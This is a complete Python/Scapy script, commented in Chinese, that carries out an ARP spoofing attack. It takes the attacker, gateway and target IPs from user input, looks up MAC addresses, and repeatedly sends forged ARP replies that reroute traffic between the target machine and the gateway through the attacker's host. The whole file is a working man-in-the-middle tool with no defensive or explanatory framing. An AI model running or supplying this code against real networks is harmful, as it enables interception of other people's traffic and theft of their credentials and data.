from scapy.all import *
import time

# 禁用Scapy的默认输出
conf.verb = 0

def get_mac(ip, retry=3, timeout=2):
    """获取指定IP的MAC地址"""
    for _ in range(retry):
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        response = srp(arp_request, timeout=timeout, verbose=False)[0]
        if response:
            return response[0][1].hwsrc
    return None

def arp_spoof(target_ip, gateway_ip, attacker_mac, count=1, delay=0.5):
    """执行ARP欺骗攻击"""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] 无法获取 {target_ip} 的MAC地址")
        return False

    # 构造欺骗包：告诉目标主机攻击者是网关
    spoof_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                       psrc=gateway_ip, hwsrc=attacker_mac)
    
    # 构造欺骗包：告诉网关攻击者是目标主机
    spoof_gateway = ARP(op=2, pdst=gateway_ip, hwdst=get_mac(gateway_ip),
                        psrc=target_ip, hwsrc=attacker_mac)
    
    # 发送指定次数的攻击包
    for i in range(count):
        send(spoof_target, verbose=False)
        send(spoof_gateway, verbose=False)
        print(f"[+] 发送第 {i+1}/{count} 次ARP欺骗包: "
              f"将 {target_ip} 的流量重定向到攻击者")
        if i < count - 1:  # 最后一次不需要等待
            time.sleep(delay)
    return True

if __name__ == "__main__":
    # 获取用户输入
    attacker_ip = input("1. 输入攻击者IP: ").strip()
    gateway_ip = input("2. 输入网关IP: ").strip()
    target_ip = input("3. 输入靶机IP: ").strip()
    attack_count = int(input("4. 输入攻击次数: ").strip())
    
    # 获取攻击者MAC地址
    attacker_mac = get_if_hwaddr(conf.iface)
    print(f"\n[+] 攻击者MAC: {attacker_mac}")
    print(f"[+] 网关MAC: {get_mac(gateway_ip) or '获取失败'}")
    print(f"[+] 靶机MAC: {get_mac(target_ip) or '获取失败'}")
    
    # 执行ARP攻击
    print("\n[+] 开始ARP攻击...")
    arp_spoof(target_ip, gateway_ip, attacker_mac, attack_count)
    print("[+] 攻击完成！")